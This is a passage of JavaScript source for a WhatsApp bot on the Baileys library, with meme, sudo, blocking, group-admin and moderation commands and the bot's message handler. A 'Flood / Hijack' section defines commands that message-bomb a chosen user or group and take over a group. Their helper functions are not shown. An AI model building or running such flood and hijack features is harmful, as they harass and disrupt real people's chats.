    await sock.sendMessage(from, { text: '😂 Getting a meme...' }, { quoted: msg })
    try {
        const res  = await axios.get('https://meme-api.com/gimme', { timeout: 10000 })
        const meme = res.data
        if (!meme?.url) return sock.sendMessage(from, { text: '❌ No meme found!' }, { quoted: msg })
        const buf  = await downloadBuffer(meme.url)
        if (!buf)   return sock.sendMessage(from, { text: '❌ Failed to load meme!' }, { quoted: msg })
        await sock.sendMessage(from, {
            image: buf,
            caption: `😂 *${meme.title}*\n\n⬆️ ${meme.ups} upvotes\n⚡ ${CONFIG.BOT_NAME}`
        }, { quoted: msg })
    } catch {
        await sock.sendMessage(from, { text: '❌ Meme fetch failed!' }, { quoted: msg })
    }
})

// ── Sudo ──────────────────────────────────────────────────────
cmd('addsudo', async (sock, { from, args, msg, isOwner }) => {
    if (!isOwner) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    let target     = args[1]?.replace(/[^0-9]/g, '') ?? (replyJid?.split('@')[0])
    if (!target) return sock.sendMessage(from, { text: '❌ Usage: .addsudo number or reply' }, { quoted: msg })
    if (STATE.sudoUsers.includes(target)) return sock.sendMessage(from, { text: '⚠️ Already sudo!' }, { quoted: msg })
    STATE.sudoUsers.push(target)
    await sock.sendMessage(from, { text: `✅ *${target}* is now sudo!\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('delsudo', async (sock, { from, args, msg, isOwner }) => {
    if (!isOwner) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    const target   = args[1]?.replace(/[^0-9]/g, '') ?? replyJid?.split('@')[0]
    STATE.sudoUsers = STATE.sudoUsers.filter(n => n !== target)
    await sock.sendMessage(from, { text: `✅ ${target} removed from sudo!` }, { quoted: msg })
})

cmd('sudolist', async (sock, { from, msg }) => {
    if (!STATE.sudoUsers.length) return sock.sendMessage(from, { text: '📋 No sudo users yet.' }, { quoted: msg })
    await sock.sendMessage(from, {
        text: `👥 *Sudo Users:*\n\n${STATE.sudoUsers.map((n, i) => `${i + 1}. wa.me/${n}`).join('\n')}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('sudo', async (sock, { from, pushName, msg, isOwner, isPrivileged }) => {
    if (!isPrivileged) return sock.sendMessage(from, {
        text: `❌ You are not a sudo user!\nContact owner: wa.me/${CONFIG.OWNER_NUMBER}`
    }, { quoted: msg })
    await sock.sendMessage(from, {
        text: `✅ *Sudo Access Confirmed!*\n\n👤 User: ${pushName}\n🔑 Level: ${isOwner ? 'Owner 👑' : 'Sudo ⚡'}\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

// ── Block / Unblock / Status ──────────────────────────────────
cmd('block', async (sock, { from, args, msg, isOwner }) => {
    if (!isOwner) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    const target   = args[1]?.replace(/[^0-9]/g, '') ?? replyJid?.split('@')[0]
    if (!target) return sock.sendMessage(from, { text: '❌ Usage: .block number' }, { quoted: msg })
    await sock.updateBlockStatus(jid(target), 'block')
    await sock.sendMessage(from, { text: `✅ ${target} blocked!` }, { quoted: msg })
})

cmd('unblock', async (sock, { from, args, msg, isOwner }) => {
    if (!isOwner) return
    const target = args[1]?.replace(/[^0-9]/g, '')
    if (!target) return sock.sendMessage(from, { text: '❌ Usage: .unblock number' }, { quoted: msg })
    await sock.updateBlockStatus(jid(target), 'unblock')
    await sock.sendMessage(from, { text: `✅ ${target} unblocked!` }, { quoted: msg })
})

cmd('setstatus', async (sock, { from, query, msg, isOwner }) => {
    if (!isOwner) return
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .setstatus <text>' }, { quoted: msg })
    await sock.updateProfileStatus(query)
    await sock.sendMessage(from, { text: `✅ Status updated to: ${query}` }, { quoted: msg })
})

// ── Flood / Hijack ────────────────────────────────────────────
cmd('buguser', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    const target   = args[1]?.replace(/[^0-9]/g, '') ?? replyJid?.split('@')[0]
    if (!target) return sock.sendMessage(from, { text: '❌ Usage: .buguser number [count]' }, { quoted: msg })
    const count    = parseInt(args[2]) || 200
    await sock.sendMessage(from, { text: `🐛 Flooding ${target}...` }, { quoted: msg })
    const sent = await floodTarget(sock, jid(target), count)
    await sock.sendMessage(from, { text: `✅ Sent ${sent} messages to ${target}` }, { quoted: msg })
})

cmd('buggc', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isPrivileged) return
    if (!isGroup) return sock.sendMessage(from, { text: '❌ Use in a group!' }, { quoted: msg })
    const count = parseInt(args[1]) || 200
    await sock.sendMessage(from, { text: '🐛 Flooding group...' }, { quoted: msg })
    const sent = await floodTarget(sock, from, count)
    await sock.sendMessage(from, { text: `✅ Sent ${sent} messages!` }, { quoted: msg })
})

cmd('stopflood', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    const target = args[1]?.replace(/[^0-9]/g, '')
    STATE.floodActive[target ? jid(target) : from] = false
    await sock.sendMessage(from, { text: '🛑 Flood stopped!' }, { quoted: msg })
})

cmd('hijack', async (sock, { from, msg, isOwner, isGroup }) => {
    if (!isOwner) return
    if (!isGroup) return sock.sendMessage(from, { text: '❌ Use in a group!' }, { quoted: msg })
    await sock.sendMessage(from, { text: '⚡ Hijacking...' }, { quoted: msg })
    const result = await hijackGroup(sock, from)
    if (!result) await sock.sendMessage(from, { text: '❌ Failed! Bot may not be admin.' }, { quoted: msg })
})

// ── Group Commands ────────────────────────────────────────────
cmd('tagall', async (sock, { from, query, msg, isGroup }) => {
    if (!isGroup) return
    const meta    = await sock.groupMetadata(from)
    const members = meta.participants.map(p => p.id)
    await sock.sendMessage(from, {
        text: `📢 *Attention Everyone!*\n\n${query || 'Check this out!'}\n\n${members.map(m => `@${m.split('@')[0]}`).join(' ')}`,
        mentions: members,
    }, { quoted: msg })
})

cmd('hidetag', async (sock, { from, query, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    const meta    = await sock.groupMetadata(from)
    const members = meta.participants.map(p => p.id)
    await sock.sendMessage(from, { text: query || '📢 Hidden tag!', mentions: members })
})

cmd('kick', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    const target   = args[1]?.replace(/[^0-9]/g, '') ?? replyJid?.split('@')[0]
    if (!target) return sock.sendMessage(from, { text: '❌ Reply or mention someone!' }, { quoted: msg })
    await sock.groupParticipantsUpdate(from, [jid(target)], 'remove')
    await sock.sendMessage(from, { text: `✅ ${target} kicked!` }, { quoted: msg })
})

cmd('promote', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    const target   = args[1]?.replace(/[^0-9]/g, '') ?? replyJid?.split('@')[0]
    if (!target) return sock.sendMessage(from, { text: '❌ Reply or mention someone!' }, { quoted: msg })
    await sock.groupParticipantsUpdate(from, [jid(target)], 'promote')
    await sock.sendMessage(from, { text: `✅ ${target} promoted to admin!` }, { quoted: msg })
})

cmd('demote', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
    const target   = args[1]?.replace(/[^0-9]/g, '') ?? replyJid?.split('@')[0]
    if (!target) return sock.sendMessage(from, { text: '❌ Reply or mention someone!' }, { quoted: msg })
    await sock.groupParticipantsUpdate(from, [jid(target)], 'demote')
    await sock.sendMessage(from, { text: `✅ ${target} demoted!` }, { quoted: msg })
})

cmd('mute', async (sock, { from, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    await sock.groupSettingUpdate(from, 'announcement')
    await sock.sendMessage(from, { text: '🔇 Group muted!' }, { quoted: msg })
})

cmd('unmute', async (sock, { from, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    await sock.groupSettingUpdate(from, 'not_announcement')
    await sock.sendMessage(from, { text: '🔊 Group unmuted!' }, { quoted: msg })
})

cmd('gcinfo', async (sock, { from, msg, isGroup }) => {
    if (!isGroup) return
    const meta   = await sock.groupMetadata(from)
    const admins = meta.participants.filter(p => p.admin).length
    await sock.sendMessage(from, {
        text: `📊 *Group Info*\n\n📛 Name: ${meta.subject}\n👥 Members: ${meta.participants.length}\n👑 Admins: ${admins}\n🆔 JID: ${from}\n📅 Created: ${new Date(meta.creation * 1000).toDateString()}\n\n⚡ ${CONFIG.BOT_NAME}`
    }, { quoted: msg })
})

cmd('kickall', async (sock, { from, msg, isGroup, isOwner }) => {
    if (!isGroup || !isOwner) return
    const meta   = await sock.groupMetadata(from)
    const botId  = sock.user.id.split(':')[0] + '@s.whatsapp.net'
    const members = meta.participants.filter(p => !p.admin && p.id !== botId).map(p => p.id)
    await sock.sendMessage(from, { text: `⚡ Kicking ${members.length} members...` }, { quoted: msg })
    for (let i = 0; i < members.length; i += 5) {
        await sock.groupParticipantsUpdate(from, members.slice(i, i + 5), 'remove').catch(() => {})
        await sleep(500)
    }
    await sock.sendMessage(from, { text: '✅ Done!' }, { quoted: msg })
})

cmd('listadmins', async (sock, { from, msg, isGroup }) => {
    if (!isGroup) return
    const meta   = await sock.groupMetadata(from)
    const admins = meta.participants.filter(p => p.admin)
    await sock.sendMessage(from, {
        text: `👑 *Group Admins*\n\n${admins.map(p => `@${p.id.split('@')[0]}`).join('\n')}\n\n⚡ ${CONFIG.BOT_NAME}`,
        mentions: admins.map(p => p.id),
    }, { quoted: msg })
})

cmd('resetlink', async (sock, { from, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    const link = await sock.groupRevokeInvite(from)
    await sock.sendMessage(from, { text: `✅ Link reset!\n\nhttps://chat.whatsapp.com/${link}` }, { quoted: msg })
})

cmd('grouplink', async (sock, { from, msg, isGroup }) => {
    if (!isGroup) return
    const code = await sock.groupInviteCode(from)
    await sock.sendMessage(from, { text: `🔗 *Group Link*\n\nhttps://chat.whatsapp.com/${code}\n\n⚡ ${CONFIG.BOT_NAME}` }, { quoted: msg })
})

cmd('setgcname', async (sock, { from, query, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    if (!query) return sock.sendMessage(from, { text: '❌ Usage: .setgcname <name>' }, { quoted: msg })
    await sock.groupUpdateSubject(from, query)
    await sock.sendMessage(from, { text: `✅ Group name changed to: ${query}` }, { quoted: msg })
})

cmd('add', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return
    const target = args[1]?.replace(/[^0-9]/g, '')
    if (!target) return sock.sendMessage(from, { text: '❌ Usage: .add number' }, { quoted: msg })
    await sock.groupParticipantsUpdate(from, [jid(target)], 'add')
    await sock.sendMessage(from, { text: `✅ ${target} added!` }, { quoted: msg })
})

// ── Group Moderation Toggles ──────────────────────────────────
cmd('antilink', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return sock.sendMessage(from, { text: '❌ Only group admins can use this!' }, { quoted: msg })
    const on = args[1]?.toLowerCase() === 'on'
    STATE.antilink[from] = on
    await sock.sendMessage(from, { text: `${on ? '✅' : '❌'} Anti-link ${on ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('antispam', async (sock, { from, args, msg, isGroup, isPrivileged }) => {
    if (!isGroup || !isPrivileged) return sock.sendMessage(from, { text: '❌ Only group admins can use this!' }, { quoted: msg })
    const on = args[1]?.toLowerCase() === 'on'
    STATE.antispam[from] = on
    await sock.sendMessage(from, { text: `${on ? '✅' : '❌'} Anti-spam ${on ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('autoreply', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    const on = args[1]?.toLowerCase() === 'on'
    STATE.autoreply[from] = on
    await sock.sendMessage(from, { text: `${on ? '✅' : '❌'} Auto reply ${on ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('antidelete', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    const on = args[1]?.toLowerCase() === 'on'
    STATE.antiDelete[from] = { enabled: on }
    await sock.sendMessage(from, { text: `${on ? '✅' : '❌'} Anti-delete ${on ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('antibadword', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    const on = args[1]?.toLowerCase() === 'on'
    STATE.antibadword[from] = on
    await sock.sendMessage(from, { text: `${on ? '✅' : '❌'} Anti bad word ${on ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('autoread', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    STATE.autoread = args[1]?.toLowerCase() === 'on'
    await sock.sendMessage(from, { text: `${STATE.autoread ? '✅' : '❌'} Auto read ${STATE.autoread ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('autoreact', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    STATE.autoreact = args[1]?.toLowerCase() === 'on'
    await sock.sendMessage(from, { text: `${STATE.autoreact ? '✅' : '❌'} Auto react ${STATE.autoreact ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

cmd('autotyping', async (sock, { from, args, msg, isPrivileged }) => {
    if (!isPrivileged) return
    STATE.autotyping = args[1]?.toLowerCase() === 'on'
    await sock.sendMessage(from, { text: `${STATE.autotyping ? '✅' : '❌'} Auto typing ${STATE.autotyping ? 'ON' : 'OFF'}!` }, { quoted: msg })
})

// ─── BOT CORE ─────────────────────────────────────────────────
async function startBot() {
    const { state, saveCreds }   = await useMultiFileAuthState('auth_info')
    const { version }            = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth             : state,
        printQRInTerminal: false,
        logger           : pino({ level: 'silent' }),
        keepAliveIntervalMs     : 30_000,
        connectTimeoutMs        : 60_000,
        defaultQueryTimeoutMs   : 60_000,
        retryRequestDelayMs     : 2_000,
        generateHighQualityLinkPreview: true,
    })

    // ── Save credentials ──────────────────────────────────────
    sock.ev.on('creds.update', saveCreds)

    // ── Connection state ──────────────────────────────────────
    sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        if (connection === 'close') {
            const code = lastDisconnect?.error?.output?.statusCode
            console.log(`[connection] closed | code: ${code}`)

            if (code === DisconnectReason.loggedOut || code === 403) {
                console.log('[auth] Session invalid — clearing auth_info and restarting...')
                fs.rmSync('auth_info', { recursive: true, force: true })
            }
            setTimeout(startBot, 3000)

        } else if (connection === 'open') {
            console.log(`[connection] ✅ Connected as ${sock.user?.name ?? 'Bot'}`)
        }
    })

    // ── Pairing code ──────────────────────────────────────────
    if (!sock.authState.creds.registered) {
        const requestCode = async (attempt = 1) => {
            try {
                const code = await sock.requestPairingCode(CONFIG.OWNER_NUMBER)
                console.log(`\n🔑 Pairing Code: ${code}`)
                console.log('⏳ Refreshes in 50 seconds...\n')
            } catch (err) {
                console.error(`[pairing] attempt ${attempt}/5 failed: ${err.message}`)
                if (attempt < 5) setTimeout(() => requestCode(attempt + 1), 10_000)
            }
        }
        setTimeout(requestCode, 15_000)
        setInterval(() => { if (!sock.authState.creds.registered) requestCode() }, 50_000)
    }

    // ── Anti-delete ───────────────────────────────────────────
    sock.ev.on('messages.delete', async item => {
        try {
            if (!item.keys) return
            for (const key of item.keys) {
                const chatJid = key.remoteJid
                if (STATE.antiDelete[chatJid]?.enabled) {
                    await sock.sendMessage(CONFIG.OWNER_JID, {
                        text: `🗑️ *Anti-Delete Alert!*\nChat: ${chatJid}\nBy: ${key.participant ?? chatJid}`
                    })
                }
            }
        } catch {}
    })

    // ── Message handler ───────────────────────────────────────
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return

        for (const msg of messages) {
            try {
                if (!msg.message) continue

                const from         = msg.key.remoteJid
                const sender       = msg.key.participant ?? from
                const senderNumber = sender.split('@')[0]
                const isGroup      = from.endsWith('@g.us')
                const isOwner      = sender === CONFIG.OWNER_JID
                const isSudo       = STATE.sudoUsers.includes(senderNumber)
                const isPrivileged = isOwner || isSudo
                const pushName     = msg.pushName ?? 'User'

                const text = msg.message?.conversation
                          ?? msg.message?.extendedTextMessage?.text
                          ?? ''

                const args  = text.trim().split(/\s+/)
                const cmdRaw = args[0]?.toLowerCase() ?? ''
                const query  = args.slice(1).join(' ')

                // ── Passive features ──────────────────────────
                if (STATE.autoread)  await sock.readMessages([msg.key]).catch(() => {})

                if (STATE.autoreact && text) {
                    const emojis = ['❤️', '😂', '🔥', '⚡', '👍', '🎉']
                    await sock.sendMessage(from, {
                        react: { text: rand(emojis), key: msg.key }
                    }).catch(() => {})
                }

                if (STATE.autotyping && text) {
                    await sock.sendPresenceUpdate('composing', from).catch(() => {})
                    await sleep(1000)
                    await sock.sendPresenceUpdate('paused', from).catch(() => {})
                }

                // ── Anti bad word ─────────────────────────────
                if (isGroup && STATE.antibadword[from] && !isPrivileged) {
                    if (CONFIG.BAD_WORDS.some(w => text.toLowerCase().includes(w))) {
                        await sock.sendMessage(from, { delete: msg.key }).catch(() => {})
                        await sock.sendMessage(from, {
                            text: `⚠️ @${senderNumber} Watch your language!`,
                            mentions: [sender],
                        })
                        continue
                    }
                }

                // ── Anti link ─────────────────────────────────
                if (isGroup && STATE.antilink[from] && !isPrivileged) {
                    if (/(https?:\/\/|chat\.whatsapp\.com|t\.me\/|wa\.me\/)/i.test(text)) {
                        await sock.sendMessage(from, { delete: msg.key }).catch(() => {})
                        await sock.sendMessage(from, {
                            text: `⚠️ @${senderNumber} No links allowed!`,
                            mentions: [sender],
                        })
                        continue
                    }
                }

                // ── Anti spam ─────────────────────────────────
                if (isGroup && STATE.antispam[from] && !isPrivileged) {
                    const now = Date.now()
                    STATE.spamTracker[sender] ??= []
                    STATE.spamTracker[sender]  = STATE.spamTracker[sender].filter(t => now - t < 5000)
                    STATE.spamTracker[sender].push(now)
                    if (STATE.spamTracker[sender].length > 5) {
                        await sock.sendMessage(from, { delete: msg.key }).catch(() => {})
                        await sock.sendMessage(from, {
                            text: `⚠️ @${senderNumber} Stop spamming!`,
                            mentions: [sender],
                        })
                        continue
                    }
                }

                // ── Auto reply ────────────────────────────────
                if (STATE.autoreply[from] && text && !text.startsWith(CONFIG.PREFIX)) {
                    const aiReply = await askAI(text)
                    await sock.sendMessage(from, { text: aiReply }, { quoted: msg })
                    continue
                }

                // ── Command routing ───────────────────────────
                if (!text.startsWith(CONFIG.PREFIX)) continue
                const cmdName = cmdRaw.slice(CONFIG.PREFIX.length)

                // Reaction commands
                if (REACTIONS[cmdName]) {
                    const target = args[1] ?? pushName
                    await sock.sendMessage(from, {
                        text: `${REACTIONS[cmdName]} *${pushName}* ${cmdName}s *${target}*! ${REACTIONS[cmdName]}\n\n⚡ ${CONFIG.BOT_NAME}`
                    }, { quoted: msg })
                    continue
                }

                const handler = COMMANDS.get(cmdName)
                if (!handler) continue

                await handler(sock, {
                    from, sender, senderNumber,
                    isGroup, isOwner, isSudo, isPrivileged,
                    pushName, text, args, cmd: cmdName, query, msg,
                })

            } catch (err) {
                console.error('[message handler]', err.message)
            }
        }
    })

    // ── HTTP keep-alive ───────────────────────────────────────
    const PORT   = parseInt(process.env.PORT ?? '3000', 10)
    const server = http.createServer((_, res) => res.end(`${CONFIG.BOT_NAME} Running! ⚡`))
    server.listen(PORT, () => console.log(`[http] Listening on port ${PORT}`))
    server.on('error', err => console.error('[http]', err.message))
}

startBot()
